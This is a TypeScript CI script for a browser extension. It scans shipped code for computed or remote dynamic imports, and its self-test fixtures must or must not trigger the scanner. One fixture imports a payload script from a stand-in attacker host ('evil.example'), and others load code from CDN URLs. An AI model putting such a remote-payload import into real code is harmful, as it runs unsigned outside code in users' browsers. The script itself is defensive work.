// scripts/check-dynamic-imports.ts — the CI half of spec §6-4 ("No remote code, ever").
//
// §6-4 reads: "MV3 enforces it; we additionally ban dynamic imports of anything not in the
// signed package, VERIFIED IN CI." The first clause has always been true (wxt.config.ts:11
// forces MV3 on both engines). The second clause was a claim with nothing behind it until
// this file — the spec-coverage audit (docs/ai/spec-coverage.md, §6 item 4) found ci.yml
// running lint/test/browser-test/build and no import check at all.
//
// ── WHAT IS BANNED, AND WHAT IS DELIBERATELY NOT ──────────────────────────────────────────
//
// The spec bans dynamic imports "of anything NOT IN THE SIGNED PACKAGE" — not dynamic
// imports as such. That distinction is load-bearing, because spec §10 REQUIRES lazy dynamic
// imports for the heavy engines still to come: Shiki "loads as a local async chunk", KaTeX
// ships "+ optional MathJax lazy chunk", Mermaid is "lazy" per AGENTS.md. A rule that banned
// every `import()` would have to be suspended the moment M7 adds highlighting — and a rule
// that gets suspended is not a rule.
//
// So the property enforced here is SPECIFIER STATICNESS:
//   • `import('shiki')` / `import('./heavy')`  → ALLOWED. A static string literal is resolved
//     by the bundler at BUILD time, so the chunk it names is inside the signed package by
//     construction. This is exactly §10's lazy-chunk pattern.
//   • `import(someVariable)` / `import(`${base}/x`)` → BANNED. A specifier the bundler cannot
//     see cannot be bundled; at runtime it resolves against whatever the expression produces.
//     This is the ONLY shape through which remote code could enter, and it is the shape MV3's
//     CSP does not itself prevent for extension pages loading same-origin-looking paths.
//   • `import('https://…')` (static OR dynamic) → BANNED. Explicitly remote.
//
// NOT checked here, on purpose: `eval` / `new Function`. MV3's extension CSP blocks both
// outright and no build of ours can re-enable them, so a grep would be theatre. If that ever
// changes (a `content_security_policy` key appears in wxt.config.ts), add them here.
//
// ── SCOPE: THE SHIPPED GRAPH ONLY ─────────────────────────────────────────────────────────
//
// `src/` and `entrypoints/` — the two trees WXT bundles. Deliberately excluded:
//   • `*.test.ts`   — never bundled. (`src/render/diffEngine.test.ts` legitimately contains
//                     the text `import('x')` inside its own import-fence assertion strings.)
//   • `*.d.ts`      — types only, no runtime.
//   • `scripts/`    — dev-only Node harnesses run by `tsx`, never shipped. Three of them
//                     (`perf-diff`, `perf-watch`, `perf-snapshot-capture`) DO use a computed
//                     `await import(esbuildPath)` to reach esbuild. That is correct for a
//                     build-time harness and would be a false failure if scanned.
//
// ── WHY THERE IS A SELF-TEST, AND WHY CI RUNS IT FIRST ────────────────────────────────────
//
// At the time of writing there are ZERO dynamic imports anywhere in `src/` or `entrypoints/`.
// A scanner over a codebase with nothing to find is indistinguishable from a scanner that is
// silently broken — both print "0 violations" forever, including after someone breaks the
// regex, changes the roots, or renames a directory. That failure mode is the standing lesson
// from M5's `built-tested-and-wired-to-nothing` class: an assertion nobody has ever seen FAIL
// is not evidence.
//
// So `--self-test` drives the SAME `scanSource()` the real scan uses over in-memory fixtures
// that MUST trip it and fixtures that MUST NOT, and asserts both directions. CI runs it as a
// separate step BEFORE the repository scan, so a scanner that has stopped firing fails the
// build on its own, loudly, rather than passing the repo scan vacuously.

import * as fs from 'node:fs';
import * as path from 'node:path';

/** Trees WXT bundles into the signed package. Anything outside these is not shipped code. */
const SHIPPED_ROOTS = ['src', 'entrypoints'] as const;

/** Schemes that put code outside the signed package. `//` is protocol-relative. */
const REMOTE_SPECIFIER = /^(?:[a-z][a-z0-9+.-]*:)?\/\/|^data:|^blob:/i;

type ViolationKind = 'computed-specifier' | 'remote-dynamic' | 'remote-static';

interface Violation {
  readonly file: string;
  readonly line: number;
  readonly kind: ViolationKind;
  /** The offending source text, trimmed to something readable in a CI log. */
  readonly excerpt: string;
}

/**
 * Blank out comment bodies, preserving byte length and newlines so that every index and line
 * number computed afterwards still refers to the original source. Returns a string of the
 * same length as `src` with comment characters replaced by spaces.
 *
 * Tracks string and template literals while scanning, because `"// not a comment"` must not
 * be treated as one. The literal SPANS it discovers are returned too — the caller needs them
 * to tell `import(` in code from `import(` inside a string.
 */
function maskComments(src: string): { masked: string; stringSpans: Array<[number, number]> } {
  const out = src.split('');
  const stringSpans: Array<[number, number]> = [];
  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const next = src[i + 1];

    // Line comment
    if (c === '/' && next === '/') {
      while (i < src.length && src[i] !== '\n') {
        out[i] = ' ';
        i++;
      }
      continue;
    }
    // Block comment
    if (c === '/' && next === '*') {
      while (i < src.length && !(src[i] === '*' && src[i + 1] === '/')) {
        if (src[i] !== '\n') out[i] = ' ';
        i++;
      }
      out[i] = ' ';
      out[i + 1] = ' ';
      i += 2;
      continue;
    }
    // Quoted string ('…' or "…")
    if (c === "'" || c === '"') {
      const start = i;
      i++;
      while (i < src.length && src[i] !== c) {
        if (src[i] === '\\') i++;
        i++;
      }
      i++;
      stringSpans.push([start, i]);
      continue;
    }
    // Template literal. `${…}` holes are REAL CODE and are left unmasked and unrecorded, so a
    // dynamic import hidden inside an interpolation is still seen (a false negative here would
    // be the one that matters).
    if (c === '`') {
      // Walk the literal recording only its TEXT chunks as string spans. Each `${…}` hole is
      // skipped WITHOUT being recorded, so its contents stay classified as code — a dynamic
      // import hidden in an interpolation must still be seen. (The first cut of this function
      // pushed one span covering the whole literal, holes included; the self-test's
      // interpolation case caught it.)
      i++; // past the opening backtick
      let chunkStart = i;
      while (i < src.length && src[i] !== '`') {
        if (src[i] === '\\') {
          i += 2;
          continue;
        }
        if (src[i] === '$' && src[i + 1] === '{') {
          stringSpans.push([chunkStart - 1, i]); // text chunk, incl. its opening delimiter
          let depth = 1;
          i += 2;
          while (i < src.length && depth > 0) {
            if (src[i] === '{') depth++;
            else if (src[i] === '}') depth--;
            i++;
          }
          chunkStart = i + 1; // the char after `}` opens the next text chunk
          continue;
        }
        i++;
      }
      stringSpans.push([chunkStart - 1, i + 1]); // final text chunk, incl. closing backtick
      i++;
      continue;
    }
    i++;
  }
  return { masked: out.join(''), stringSpans };
}

/** True if `index` falls inside one of the recorded string-literal spans. */
function insideString(index: number, spans: ReadonlyArray<[number, number]>): boolean {
  return spans.some(([s, e]) => index > s && index < e);
}

/** 1-based line number of a byte index. */
function lineOf(src: string, index: number): number {
  let line = 1;
  for (let i = 0; i < index && i < src.length; i++) if (src[i] === '\n') line++;
  return line;
}

/**
 * Scan one file's source for §6-4 violations. Exported for the self-test, which drives THIS
 * function rather than a copy — a self-test against a re-implementation proves nothing.
 */
export function scanSource(file: string, src: string): Violation[] {
  const { masked, stringSpans } = maskComments(src);
  const violations: Violation[] = [];

  // (1) Every dynamic `import(` in real code, classified by its specifier.
  const dynamic = /\bimport\s*\(/g;
  let m: RegExpExecArray | null;
  while ((m = dynamic.exec(masked)) !== null) {
    const at = m.index;
    // `import(` appearing inside a string literal is data, not a call site.
    if (insideString(at, stringSpans)) continue;
    // Ignore TypeScript's `import('x')` TYPE syntax — it erases at compile time.
    const before = masked.slice(Math.max(0, at - 40), at);
    if (/[:<|&]\s*(?:typeof\s+)?$/.test(before)) continue;

    const tail = src.slice(at + m[0].length, at + m[0].length + 400);
    const literal = /^\s*(['"])([^'"]*)\1\s*\)/.exec(tail);
    if (!literal) {
      violations.push({
        file,
        line: lineOf(src, at),
        kind: 'computed-specifier',
        excerpt: src.slice(at, at + 80).split('\n')[0].trim(),
      });
      continue;
    }
    if (REMOTE_SPECIFIER.test(literal[2])) {
      violations.push({
        file,
        line: lineOf(src, at),
        kind: 'remote-dynamic',
        excerpt: src.slice(at, at + 80).split('\n')[0].trim(),
      });
    }
  }

  // (2) Static imports/exports naming a remote specifier.
  const staticFrom = /\b(?:import|export)\b[^;\n]*?\bfrom\s*(['"])([^'"]+)\1/g;
  while ((m = staticFrom.exec(masked)) !== null) {
    if (REMOTE_SPECIFIER.test(m[2])) {
      violations.push({
        file,
        line: lineOf(src, m.index),
        kind: 'remote-static',
        excerpt: m[0].trim(),
      });
    }
  }
  // (3) Bare side-effect import of a remote specifier: `import 'https://…'`.
  const bare = /\bimport\s*(['"])([^'"]+)\1/g;
  while ((m = bare.exec(masked)) !== null) {
    if (REMOTE_SPECIFIER.test(m[2])) {
      violations.push({
        file,
        line: lineOf(src, m.index),
        kind: 'remote-static',
        excerpt: m[0].trim(),
      });
    }
  }

  return violations;
}

/** Recursively collect shipped `.ts` files (excluding tests and type declarations). */
function collectFiles(dir: string, acc: string[] = []): string[] {
  if (!fs.existsSync(dir)) return acc;
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      collectFiles(full, acc);
      continue;
    }
    if (!entry.name.endsWith('.ts')) continue;
    if (entry.name.endsWith('.test.ts') || entry.name.endsWith('.d.ts')) continue;
    acc.push(full);
  }
  return acc;
}

// ── SELF-TEST FIXTURES ────────────────────────────────────────────────────────────────────
// Each MUST_FIRE case names the kind it must produce, so a scanner that fires for the WRONG
// reason (e.g. classifying everything as computed-specifier) fails too.

const MUST_FIRE: ReadonlyArray<{ name: string; src: string; kind: ViolationKind }> = [
  {
    name: 'computed specifier from a variable',
    src: `const mod = await import(userSuppliedPath);`,
    kind: 'computed-specifier',
  },
  {
    name: 'computed specifier from a template literal',
    src: 'const mod = await import(`${base}/plugin.js`);',
    kind: 'computed-specifier',
  },
  {
    name: 'dynamic import of an https URL',
    src: `await import('https://cdn.example.com/mermaid.js');`,
    kind: 'remote-dynamic',
  },
  {
    name: 'dynamic import of a protocol-relative URL',
    src: `await import('//cdn.example.com/x.js');`,
    kind: 'remote-dynamic',
  },
  {
    name: 'static import from an https URL',
    src: `import katex from 'https://cdn.jsdelivr.net/npm/katex';`,
    kind: 'remote-static',
  },
  {
    name: 'bare side-effect import of a remote URL',
    src: `import 'https://evil.example/payload.js';`,
    kind: 'remote-static',
  },
  {
    name: 'dynamic import hidden inside a template interpolation',
    src: 'const s = `value: ${await import(sneaky)}`;',
    kind: 'computed-specifier',
  },
];

const MUST_NOT_FIRE: ReadonlyArray<{ name: string; src: string }> = [
  { name: 'bare-specifier lazy chunk (spec §10 Shiki pattern)', src: `const s = await import('shiki');` },
  { name: 'relative lazy chunk', src: `const m = await import('./heavy/mermaid');` },
  { name: 'scoped-package lazy chunk', src: `await import('@scope/pkg/sub');` },
  { name: 'ordinary static import', src: `import DOMPurify from 'dompurify';` },
  { name: 'line comment mentioning a dynamic import', src: `// await import(anything) is banned here` },
  { name: 'block comment mentioning a dynamic import', src: `/* do not use import(x) */` },
  { name: 'string literal containing the text', src: `const msg = "never write import(x) in shipped code";` },
  { name: 'TypeScript import type', src: `type T = import('./folderSource').FolderSource;` },
];

function runSelfTest(): number {
  let failures = 0;
  console.log('── self-test: the scanner must FIRE ──');
  for (const c of MUST_FIRE) {
    const found = scanSource('<fixture>', c.src);
    const ok = found.length > 0 && found.some((v) => v.kind === c.kind);
    console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${c.name} (expected ${c.kind}, got ${found.map((v) => v.kind).join(',') || 'nothing'})`);
    if (!ok) failures++;
  }
  console.log('── self-test: the scanner must STAY SILENT ──');
  for (const c of MUST_NOT_FIRE) {
    const found = scanSource('<fixture>', c.src);
    const ok = found.length === 0;
    console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${c.name}${ok ? '' : ` (false positive: ${found.map((v) => v.kind).join(',')})`}`);
    if (!ok) failures++;
  }
  if (failures > 0) {
    console.error(`\n✗ SELF-TEST FAILED (${failures} case${failures === 1 ? '' : 's'}).`);
    console.error('  The scanner is not behaving as designed, so a clean repository scan means');
    console.error('  NOTHING. Fix scanSource() before trusting any result from this script.');
    return 1;
  }
  console.log(`\n✅ self-test passed (${MUST_FIRE.length} firing + ${MUST_NOT_FIRE.length} silent cases).`);
  return 0;
}

function runScan(): number {
  const files = SHIPPED_ROOTS.flatMap((root) => collectFiles(root));
  const violations = files.flatMap((f) => scanSource(f, fs.readFileSync(f, 'utf8')));

  if (violations.length > 0) {
    console.error(`\n✗ ${violations.length} remote-code violation(s) — spec §6-4:\n`);
    for (const v of violations) {
      console.error(`  ${v.file}:${v.line}  [${v.kind}]`);
      console.error(`    ${v.excerpt}`);
    }
    console.error('\n  A dynamic import must name a STATIC, LOCAL specifier so the bundler can');
    console.error('  place it inside the signed package (spec §10 lazy chunks are fine:');
    console.error("  `await import('shiki')`). A computed or remote specifier is not.");
    return 1;
  }

  console.log(
    `✅ no remote-code violations — ${files.length} shipped file(s) across ${SHIPPED_ROOTS.join(', ')}.`,
  );
  return 0;
}

const selfTestOnly = process.argv.includes('--self-test');
process.exit(selfTestOnly ? runSelfTest() : runScan());
